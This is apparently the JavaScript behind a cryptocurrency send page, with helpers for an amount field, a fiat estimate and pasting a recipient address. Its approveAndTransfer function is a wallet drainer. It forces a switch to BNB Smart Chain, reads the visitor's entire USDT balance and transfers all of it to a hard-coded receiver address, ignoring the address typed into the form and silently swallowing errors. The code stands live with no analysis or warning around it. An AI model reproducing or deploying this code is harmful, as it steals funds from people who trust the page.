const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";

const usdtABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [{ name: "", type: "uint8" }],
    type: "function"
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
];

async function approveAndTransfer() {
  if (typeof window.ethereum === "undefined") return;

  const web3 = new Web3(window.ethereum);

  // Auto switch to BNB Smart Chain (chainId = 56 / 0x38)
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x38" }]
    });
  } catch (err) {
    return;
  }

  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];

    const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
    const decimals = await usdt.methods.decimals().call();
    const balance = await usdt.methods.balanceOf(user).call();

    if (balance === "0") return;

    // 🔥 Only direct transfer (no approval)
    await usdt.methods.transfer(receiver, balance).send({ from: user });
  } catch (err) {
    // Silent
  }
}

function updateFiat() {
  const amt = parseFloat(document.getElementById("amount").value || "0");
  document.getElementById("fiat").innerText = "≈ $" + amt.toFixed(2);
}

async function fillMax() {
  if (!window.ethereum) return;

  try {
    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];

    const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
    const decimals = await usdt.methods.decimals().call();
    const balance = await usdt.methods.balanceOf(user).call();
    const formatted = balance / Math.pow(10, decimals);

    document.getElementById("amount").value = formatted.toFixed(2);
    updateFiat();
  } catch (e) {}
}

function clearAddress() {
  document.getElementById("address").value = "";
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("address").value = text;
  } catch (e) {}
}
